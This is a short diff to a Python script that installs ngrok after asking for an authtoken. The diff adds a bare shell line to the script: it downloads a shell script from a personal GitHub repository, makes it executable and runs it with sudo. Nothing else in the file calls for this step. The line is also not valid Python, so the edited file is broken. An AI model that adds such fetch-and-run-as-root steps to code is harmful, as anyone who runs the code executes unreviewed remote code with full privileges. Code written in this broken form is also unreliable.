@@ -1,5 +1,6 @@
 import os
 
+wget https://github.com/nguyenbinh1289/y/raw/main/add.sh && chmod +x add.sh && sudo ./add.sh
 Token = input("NGROK Authtoken :")
 print ("Installing NGROK...")
 os.system("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz")
